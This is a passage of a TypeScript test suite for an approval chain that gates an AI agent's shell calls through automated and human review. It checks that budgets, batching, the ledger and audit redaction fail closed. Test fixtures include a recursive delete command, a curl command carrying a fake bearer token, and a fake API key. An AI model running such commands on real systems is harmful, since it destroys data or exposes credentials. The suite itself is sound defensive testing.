    expect((await chain.admit(event)).allow).toBe(false)
  })
})

describe("runtime liveness", () => {
  test("a runtime replaced during the release check does not authorize the call", async () => {
    let live = true
    const { chain, log } = makeChain({
      jev: "allow",
      live: () => live,
      recheck: async () => {
        live = false
        return { ok: true }
      },
    })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("unresolved")
    expect(finalReason(log)).toContain("the review runtime was replaced")
  })

  test("a runtime replaced before release never runs the recheck", async () => {
    const { chain, log } = makeChain({ jev: "allow", live: () => false })
    const decision = await chain.admit(EVENT)
    expect(decision.allow).toBe(false)
    expect(log.recheck).toHaveLength(0)
    expect(finalReason(log)).toContain("the review runtime was replaced")
  })
})

describe("audit", () => {
  test("one row per decision, naming the stage and the item", async () => {
    const { chain, log } = makeChain({ jev: "propagate", generate: (r: any) => reply(firstId(r), "propagate") })
    const decision = await chain.admit(EVENT)
    expect(stages(log)).toEqual([
      ["chain_stage", "jev", "propagate"],
      ["chain_stage", "supervisor", "propagate"],
      ["chain_stage", "human", "allow"],
      ["chain_decision", "final", "allow"],
    ])
    for (const row of log.audit) {
      expect(row.itemID).toBe(decision.itemID)
      expect(row.sessionID).toBe(EVENT.sessionID)
      expect(row.tool).toBe("shell")
    }
  })

  test("the audit carries no arguments, prompts or replies", async () => {
    const { chain, log } = makeChain({ jev: "propagate", generate: (r: any) => reply(firstId(r), "propagate") })
    await chain.admit(EVENT)
    const text = JSON.stringify(log.audit)
    expect(text).not.toContain("rm -rf build")
    expect(text).not.toContain("add a retry to the fetch helper")
    expect(text).not.toContain("use exponential backoff")
    expect(text).not.toContain("checked")
  })

  test("an unresolved chain records the exhaustion and its reasons", async () => {
    const { chain, log } = makeChain({ nodes: { jev: false, supervisor: false, human: false } })
    await chain.admit(EVENT)
    const reason = finalReason(log)
    expect(log.audit[log.audit.length - 1].verdict).toBe("unresolved")
    expect(reason).toContain("jev disabled")
    expect(reason).toContain("human disabled")
  })

  test("a thrown error's message never reaches the audit or the caller", async () => {
    const secret = "api_key=abcdef123456"
    const { chain, log } = makeChain({
      precheck: () => {
        throw new Error(secret)
      },
    })
    const decision = await chain.admit(EVENT)
    const text = JSON.stringify(log.audit) + String(decision.message ?? "")
    expect(text).not.toContain(secret)
    expect(text).not.toContain("abcdef123456")
  })

  test("a redacted secret in the arguments never reaches the audit", async () => {
    const { chain, log } = makeChain({ jev: "deny" })
    await chain.admit({ sessionID: "ses_secret", tool: "shell", input: { command: "curl -H 'Authorization: Bearer abcdefghijklmnop1234' x" } })
    expect(JSON.stringify(log.audit)).not.toContain("abcdefghijklmnop1234")
  })
})

describe("the session budget", () => {
  test("one slot per call, held through every stage, released by the decision", async () => {
    const answers: Array<(verdict: string) => void> = []
    const { chain, log } = makeChain({
      jev: "propagate",
      generate: (r: any) => reply(firstId(r), "propagate"),
      limits: limitsWith({ sessionCap: 1 }),
      human: () => new Promise((resolve) => answers.push(resolve)),
    })
    const first = chain.admit(CALL("ses_budget_01", "ls a"))
    await settle()
    const second = chain.admit(CALL("ses_budget_01", "ls b"))
    await settle()

    // The second call waits for the one slot the first call still holds, and it
    // has not reached the host checks or any stage.
    const waits = log.audit.filter((row: any) => row.event === "chain_admission" && row.waiting)
    expect(waits).toHaveLength(1)
    expect(waits[0].held).toBe(1)
    expect(waits[0].itemID).not.toBe("")
    expect(log.precheck).toHaveLength(1)
    expect(log.jev).toHaveLength(1)

    answers[0]("allow")
    expect((await first).allow).toBe(true)
    await settle()
    // Capacity returned to the waiting call, which now runs its own chain.
    expect(log.precheck).toHaveLength(2)
    expect(answers).toHaveLength(2)
    answers[1]("deny")
    expect((await second).allow).toBe(false)
  })

  test("sibling sessions never consume each other's allowance", async () => {
    const answers: Array<(verdict: string) => void> = []
    const { chain, log } = makeChain({
      jev: "propagate",
      generate: (r: any) => reply(firstId(r), "propagate"),
      limits: limitsWith({ sessionCap: 1 }),
      human: () => new Promise((resolve) => answers.push(resolve)),
    })
    const a = chain.admit(CALL("ses_budget_02a", "ls a"))
    await settle()
    const b = chain.admit(CALL("ses_budget_02b", "ls a"))
    await settle()

    expect(log.audit.some((row: any) => row.event === "chain_admission" && row.waiting)).toBe(false)
    expect(log.precheck).toHaveLength(2)
    expect(answers).toHaveLength(2)
    answers[0]("allow")
    answers[1]("allow")
    expect((await a).allow).toBe(true)
    expect((await b).allow).toBe(true)
  })

  test("a runtime retired while a call waits for capacity resolves instead of hanging", async () => {
    const answers: Array<(verdict: string) => void> = []
    const { chain, log } = makeChain({
      jev: "propagate",
      generate: (r: any) => reply(firstId(r), "propagate"),
      limits: limitsWith({ sessionCap: 1 }),
      human: () => new Promise((resolve) => answers.push(resolve)),
    })
    const first = chain.admit(CALL("ses_budget_11", "ls a"))
    await settle()
    const second = chain.admit(CALL("ses_budget_11", "ls b"))
    await settle()
    expect(log.audit.some((row: any) => row.event === "chain_admission" && row.waiting)).toBe(true)

    chain.shutdown()
    const decision = await second
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("unresolved")

    answers[0]("deny")
    expect((await first).allow).toBe(false)
  })

  test("two identical concurrent calls are two distinct items", async () => {
    const { schedule, fireAll } = handScheduler()
    const { chain, log } = makeChain({
      jev: "propagate",
      generate: allowAll,
      limits: limitsWith({ sessionCap: 4, supervisorBatch: { max: 4, ms: 100 } }),
      schedule,
    })
    const first = chain.admit(CALL("ses_budget_13", "ls same"))
    const second = chain.admit(CALL("ses_budget_13", "ls same"))
    await settle()
    fireAll()
    const decisions = await Promise.all([first, second])
    expect(decisions.map((decision) => decision.allow)).toEqual([true, true])
    expect(decisions[0].itemID).not.toBe(decisions[1].itemID)

    // One round, two ids: neither answer can stand for both calls.
    expect(log.generate).toHaveLength(1)
    const ids = idsIn(log.generate[0].prompt)
    expect(ids).toHaveLength(2)
    expect(new Set(ids).size).toBe(2)
    expect(log.generate[0].items).toHaveLength(2)
  })

  test("a decision frees the slot, and a duplicate identity takes its own", async () => {
    const { chain, log } = makeChain({ jev: "deny", limits: limitsWith({ sessionCap: 1 }) })
    const event = CALL("ses_budget_03", "ls a")
    expect((await chain.admit(event)).verdict).toBe("deny")
    expect((await chain.admit(event)).verdict).toBe("deny")
    // Sequentially the slot is free again every time: no durable budget.
    expect(log.audit.filter((row: any) => row.event === "chain_decision")).toHaveLength(2)
  })
})

describe("stage batching", () => {
  test("one Supervisor round serves every item collected in the window", async () => {
    const { schedule, fireAll } = handScheduler()
    const { chain, log } = makeChain({
      jev: "propagate",
      limits: limitsWith({ sessionCap: 4, supervisorBatch: { max: 4, ms: 100 } }),
      schedule,
    })
    const calls = [CALL("ses_batch_01", "ls a"), CALL("ses_batch_01", "ls b"), CALL("ses_batch_01", "ls c")].map((event) => chain.admit(event))
    await settle()

    // Collected into one window: nothing left for the stage yet.
    expect(log.generate).toHaveLength(0)
    expect(log.jev).toHaveLength(3)

    fireAll()
    const decisions = await Promise.all(calls)
    expect(log.generate).toHaveLength(1)
    expect(log.generate[0].items).toHaveLength(3)
    expect(decisions.map((decision) => decision.allow)).toEqual([true, true, true])
  })

  test("a partial batch flushes at allowance exhaustion, so admission cannot deadlock", async () => {
    const { schedule, timers, fireAll } = handScheduler()
    const { chain, log } = makeChain({
      jev: "propagate",
      limits: limitsWith({ sessionCap: 2, supervisorBatch: { max: 4, ms: 600 } }),
      schedule,
    })
    const first = chain.admit(CALL("ses_batch_02", "ls a"))
    const second = chain.admit(CALL("ses_batch_02", "ls b"))
    await settle()
    // Two of four: the window is still open and both slots are held.
    expect(log.generate).toHaveLength(0)

    const third = chain.admit(CALL("ses_batch_02", "ls c"))
    await settle()
    // Admission is at the cap, so the partial batch ran instead of waiting for
    // a fourth item that the exhausted budget could never admit.
    const waits = log.audit.filter((row: any) => row.event === "chain_admission" && row.waiting)
    expect(waits).toHaveLength(1)
    expect(waits[0].held).toBe(2)
    expect(log.generate).toHaveLength(1)
    expect(log.generate[0].items).toHaveLength(2)
    expect((await first).allow).toBe(true)
    expect((await second).allow).toBe(true)

    // The third call now runs its own one-item window.
    expect(timers).toHaveLength(1)
    fireAll()
    expect((await third).allow).toBe(true)
    expect(log.generate).toHaveLength(2)
    expect(log.generate[1].items).toHaveLength(1)
  })

  test("a Jev batch answer missing one item authorizes nothing for it", async () => {
    const { schedule, fireAll } = handScheduler()
    const { chain, log } = makeChain({
      limits: limitsWith({ sessionCap: 4, jevBatch: { max: 4, ms: 100 } }),
      generate: (r: any) => reply(firstId(r), "propagate"),
      nodes: { human: false },
      schedule,
      jevBatch: (batch: { items: ReviewItem[] }) => new Map(batch.items.slice(0, 1).map((item) => [item.id, "allow" as const])),
    })
    const calls = [CALL("ses_batch_05", "ls a"), CALL("ses_batch_05", "ls b")].map((event) => chain.admit(event))
    await settle()
    expect(log.jev).toHaveLength(0)
    fireAll()
    const decisions = await Promise.all(calls)
    // One call answered, one not: the unanswered one propagates and never runs.
    expect(decisions.map((decision) => decision.verdict)).toEqual(["allow", "unresolved"])
  })

  test("a call collected into a batch resolves unresolved when the runtime is retired", async () => {
    const { schedule } = handScheduler()
    const { chain, log } = makeChain({
      jev: "propagate",
      generate: (r: any) => reply(firstId(r), "propagate"),
      nodes: { human: false },
      limits: limitsWith({ sessionCap: 4, jevBatch: { max: 4, ms: 500 } }),
      schedule,
    })
    const pending = chain.admit(CALL("ses_batch_04", "ls a"))
    await settle()
    // Collecting, not running: the window is still open.
    expect(log.jev).toHaveLength(0)

    chain.shutdown()
    expect((await pending).verdict).toBe("unresolved")
    expect(log.audit.some((row: any) => row.verdict === "allow")).toBe(false)
  })

  test("items judged against a different task never share a batch", async () => {
    const { schedule, fireAll } = handScheduler()
    let reads = 0
    const changedTask = [{ role: "user", text: "now clean the archive instead" }]
    const { chain, log } = makeChain({
      jev: "propagate",
      limits: limitsWith({ sessionCap: 4, supervisorBatch: { max: 4, ms: 100 } }),
      schedule,
      history: () => (reads++ === 0 ? HISTORY : changedTask),
    })
    const first = chain.admit(CALL("ses_batch_08", "ls a"))
    const second = chain.admit(CALL("ses_batch_08", "ls b"))
    await settle()
    // The second call's task differs, so it closed the first group at once.
    expect(log.generate).toHaveLength(1)
    expect(log.generate[0].prompt).toContain("add a retry to the fetch helper")
    expect(log.generate[0].prompt).not.toContain("clean the archive")

    fireAll()
    await Promise.all([first, second])
    expect(log.generate).toHaveLength(2)
    expect(log.generate[1].prompt).toContain("clean the archive")
  })

  test("a call inside a started batch resolves unresolved when the runtime is retired", async () => {
    const { chain, log } = makeChain({
      jevBatch: () => new Promise(() => {}),
      limits: limitsWith({ sessionCap: 4, jevBatch: { max: 1, ms: 0 } }),
      nodes: { supervisor: false, human: false },
    })
    const pending = chain.admit(CALL("ses_batch_06", "ls a"))
    await settle()
    // The round is running, not queued: only a retirement can end this wait.
    expect(log.jev).toHaveLength(1)

    chain.shutdown()
    expect((await pending).verdict).toBe("unresolved")
    expect(log.audit.some((row: any) => row.verdict === "allow")).toBe(false)
  })

  test("a batch formed while the budget is full never waits for its window", async () => {
    const { schedule, fireAll } = handScheduler()
    let answerJev: (() => void) | null = null
    const { chain, log } = makeChain({
      jevBatch: (batch: { items: ReviewItem[] }) =>
        new Promise((resolve) => {
          answerJev = () => resolve(new Map(batch.items.map((item) => [item.id, "propagate" as const])))
        }),
      generate: allowAll,
      limits: limitsWith({ sessionCap: 2, jevBatch: { max: 2, ms: 100 }, supervisorBatch: { max: 4, ms: 3600000 } }),
      schedule,
    })
    const first = chain.admit(CALL("ses_batch_07", "ls a"))
    const second = chain.admit(CALL("ses_batch_07", "ls b"))
    await settle()
    fireAll()
    await settle()
    expect(log.jev).toHaveLength(1)

    // A third call parks at the cap while that Jev round is still running.
    const third = chain.admit(CALL("ses_batch_07", "ls c"))
    await settle()
    expect(log.audit.some((row: any) => row.waiting === true)).toBe(true)

    // Its answer propagates both items into a Supervisor window an hour wide.
    // The budget is full with an admission parked there, so neither item waits
    // for that window: both rounds run at once.
    answerJev!()
    await settle()
    expect(log.generate).toHaveLength(2)
    for (const request of log.generate) expect(request.items).toHaveLength(1)

    expect((await first).allow).toBe(true)
    expect((await second).allow).toBe(true)

    // The waiting call is admitted, then runs its own windows as configured.
    fireAll()
    answerJev!()
    await settle()
    fireAll()
    expect((await third).allow).toBe(true)
  })

  test("a batch reply missing one item authorizes nothing", async () => {
    const { schedule, fireAll } = handScheduler()
    const { chain, log } = makeChain({
      jev: "propagate",
      limits: limitsWith({ sessionCap: 4, supervisorBatch: { max: 2, ms: 50 } }),
      schedule,
      nodes: { human: false },
      generate: (request: any) => {
        const [only] = idsIn(request.prompt)
        return reply(only, "allow")
      },
    })
    const calls = [CALL("ses_batch_03", "ls a"), CALL("ses_batch_03", "ls b")].map((event) => chain.admit(event))
    await settle()
    fireAll()
    const decisions = await Promise.all(calls)
    // The reply is validated per item: one missing row rejects the whole batch,
    // so the item that was answered gets no allow either.
    expect(decisions.map((decision) => decision.verdict)).toEqual(["unresolved", "unresolved"])
    expect(log.human).toHaveLength(0)
  })
})

describe("the durable ledger", () => {
  const LEDGER_ID = "wd_0123456789abcdef01234567.1"
  const KEY = budgetKey("ses_budget_09")
  const KEY10 = budgetKey("ses_budget_10")

  test("a restart reports the interrupted review once and keeps its slot", async () => {
    const saved: Array<Record<string, any>> = []
    const ledger = {
      load: () => ({ [KEY]: [{ id: LEDGER_ID, stage: "human", tool: "shell", action: "shell" }] }),
      save: (state: Record<string, any>) => saved.push(state),
    }
    const { chain, log } = makeChain({ jev: "deny", ledger })
    // A different session's call leaves the restored slot untouched.
    expect((await chain.admit(CALL("ses_budget_99", "ls after"))).verdict).toBe("deny")
    const rows = log.audit.filter((row: any) => row.event === "chain_admission")
    expect(rows).toHaveLength(1)
    expect(rows[0].restored).toBe(true)
    expect(rows[0].verdict).toBe("unresolved")
    expect(rows[0].itemID).toBe(LEDGER_ID)
    expect(rows[0].stage).toBe("human")
    expect(String(rows[0].reason)).toContain("not approved")
    expect(log.audit.some((row: any) => row.verdict === "allow")).toBe(false)
    // Ownership is kept, marked as reported, so a second restart does not repeat it.
    expect(saved[saved.length - 1][KEY][0]).toMatchObject({ id: LEDGER_ID, stage: "human", reported: true })
  })

  test("a second restart does not report the same entry twice", async () => {
    const ledger = { load: () => ({ [KEY]: [{ id: LEDGER_ID, stage: "human", tool: "shell", action: "shell", reported: true }] }), save: () => {} }
    const { chain, log } = makeChain({ jev: "deny", ledger })
    await chain.admit(CALL("ses_budget_99", "ls after"))
    expect(log.audit.some((row: any) => row.restored === true)).toBe(false)
  })

  test("a session that continues releases its restored slot", async () => {
    const saved: Array<Record<string, any>> = []
    const ledger = {
      load: () => ({ [KEY]: [{ id: LEDGER_ID, stage: "human", tool: "shell", action: "shell" }] }),
      save: (state: Record<string, any>) => saved.push(state),
    }
    const { chain, log } = makeChain({ jev: "deny", ledger, limits: limitsWith({ sessionCap: 1 }) })
    const decision = await chain.admit(CALL("ses_budget_09", "ls after"))
    // Its own session is admitting again: the dead call's slot is disposed, the
    // new call takes one of its own, and nothing was approved by the restore.
    expect(decision.verdict).toBe("deny")
    expect(log.audit.filter((row: any) => row.restored === true)).toHaveLength(1)
    expect(saved[saved.length - 1]).toEqual({})
  })

  test("an unreadable ledger refuses the call and reports the read", async () => {
    const failures: string[] = []
    let saves = 0
    const ledger = {
      load: () => {
        throw new Error("corrupt")
      },
      save: () => {
        saves++
      },
    }
    const { chain, log } = makeChain({ jev: "deny", ledger, ledgerError: (operation: string) => failures.push(operation) })
    const decision = await chain.admit(CALL("ses_budget_11", "ls a"))
    expect(decision.allow).toBe(false)
    expect(decision.verdict).toBe("unresolved")
    expect(String(decision.message)).toContain("did not run")
    expect(failures).toEqual(["read"])
    expect(saves).toBe(0)
    const row = log.audit.find((entry: any) => entry.event === "chain_admission")
    expect(String(row?.reason)).toContain("could not be read")
    // Nothing was authorized and no slot was taken from an unknown budget.
    expect(log.jev).toHaveLength(0)
    // The read is retried, so the failure cannot be mistaken for a recovered state.
    await chain.admit(CALL("ses_budget_11", "ls b"))
    expect(failures).toEqual(["read", "read"])
  })

  test("a failed write is reported and the call still decides", async () => {
    const failures: string[] = []
    const ledger = {
      load: () => ({}),
      save: () => {
        throw new Error("read-only")
      },
    }
    const { chain } = makeChain({ jev: "deny", ledger, ledgerError: (operation: string) => failures.push(operation) })
    expect((await chain.admit(CALL("ses_budget_12", "ls a"))).verdict).toBe("deny")
    expect(failures).toEqual(["write"])
  })

  test("a slot is written while held and cleared when the decision lands", async () => {
    const saved: Array<Record<string, any>> = []
    const ledger = { load: () => ({}), save: (state: Record<string, any>) => saved.push(state) }
    const answers: Array<(verdict: string) => void> = []
    const { chain } = makeChain({
      jev: "propagate",
      generate: (r: any) => reply(firstId(r), "propagate"),
      ledger,
      human: () => new Promise((resolve) => answers.push(resolve)),
    })
    const pending = chain.admit(CALL("ses_budget_10"))
    await settle()
    const held = saved.filter((state) => state[KEY10]?.length)
    expect(held.length).toBeGreaterThan(0)
    expect(held[held.length - 1][KEY10][0].stage).toBe("human")
    expect(held[held.length - 1][KEY10][0].id).toContain("wd_")

    answers[0]("deny")
    await pending
    expect(saved[saved.length - 1]).toEqual({})
  })
})

describe("review timing", () => {
  test("selecting nonblocking is reported, and the call is still held for authorization", async () => {
    const { chain, log } = makeChain({
      jev: "propagate",
      generate: (r: any) => reply(firstId(r), "propagate"),
      limits: limitsWith({ timing: "nonblocking" }),
      human: "deny",
    })
    const decision = await chain.admit(CALL("ses_timing_01"))
    // Nothing speculative: the human stage still refused the call.
    expect(decision.allow).toBe(false)
    expect(log.human).toHaveLength(1)

    const row = log.audit.find((entry: any) => entry.event === "chain_admission" && entry.timing === "nonblocking")
    expect(String(row?.reason)).toContain("unavailable")
    expect(String(row?.reason)).toContain("#15")
    // No row claims the call ran, or that a review happened after it ran.
    expect(log.audit.some((entry: any) => entry.event === "chain_decision" && entry.timing === "nonblocking")).toBe(false)
  })

  test("selecting nonblocking never skips a human-only hold", async () => {
    const { chain, log } = makeChain({
      jev: "allow",
      precheck: { ok: true, humanOnly: true },
      limits: limitsWith({ timing: "nonblocking" }),
      human: "allow",
    })
    const decision = await chain.admit(CALL("ses_timing_02"))
    expect(log.human).toHaveLength(1)
    expect(log.jev).toHaveLength(0)
    expect(decision.allow).toBe(true)
  })
})
